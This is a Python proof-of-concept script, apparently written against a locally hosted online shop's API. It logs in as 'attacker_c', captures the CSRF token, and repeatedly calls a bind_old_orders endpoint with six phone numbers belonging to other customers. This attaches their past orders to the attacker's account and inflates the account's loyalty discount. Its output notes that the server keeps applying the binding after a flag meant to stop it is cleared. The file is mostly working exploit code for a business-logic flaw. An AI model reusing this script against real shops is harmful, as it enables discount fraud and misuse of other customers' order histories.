#!/usr/bin/env python3
import sys
import time
import requests

BASE = "http://localhost:8080"

def get_discount(session):
    r = session.get(f"{BASE}/api/discount", timeout=5)
    return r.json()

s = requests.Session()
r = s.post(f"{BASE}/api/auth/register",
           json={"username": "attacker_c", "email": "c@c.com", "password": "cccc"},
           timeout=5)
if r.status_code == 400:
    print("  (user exists, logging in instead)")
    r = s.post(f"{BASE}/api/auth/login",
               json={"username": "attacker_c", "password": "cccc"},
               timeout=5)
if not r.ok:
    print(f"  [!] Could not obtain session: {r.status_code} {r.text}")
    sys.exit(1)

csrf = s.cookies.get("_csrf")
if not csrf:
    print(f"  [!] No _csrf cookie. Cookies: {dict(s.cookies)}")
    sys.exit(1)
print(f"  Logged in as attacker_c")
print(f"  _csrf: {csrf[:20]}...")


info = get_discount(s)
print(f"  discount={info['discount']}%  orders={info['orders_count']}  "
      f"add_old_orders={info['add_old_orders']}")

phones = [
    "+79991000001",   # 6 orders
    "+79991000002",   # 5 orders
    "+79991000003",   # 7 orders
    "+79991000004",   # 4 orders
    "+79991000005",   # 5 orders
    "+79991000006",   # 3 orders
]

headers = {"X-CSRF-Token": csrf, "Content-Type": "application/json"}

for phone in phones:
    r = s.post(
        f"{BASE}/api/bind_old_orders",
        json={"phone_number": phone},
        headers=headers,
        timeout=5,
    )
    info = get_discount(s)
    print(f"  {phone}  ->  HTTP {r.status_code} | "
          f"discount={info['discount']}%  orders={info['orders_count']}")
    time.sleep(0.1)

info = get_discount(s)
discount = info["discount"]
orders   = info["orders_count"]

catalog_total = 24990 + 18990 + 15990 + 12990 + 3990 + 5990 + 2990 + 7990
savings = int(catalog_total * discount / 100)

print(f"  Discount      : {discount}%")
print(f"  Orders counted: {orders}")
print(f"  Catalog total : {catalog_total:,} ₽")
print(f"  Savings       : {savings:,} ₽")
print(f"\n  add_old_orders in DB after all calls: {info['add_old_orders']}")
print("  (was set to 0 after call 1, but server kept running the logic)")
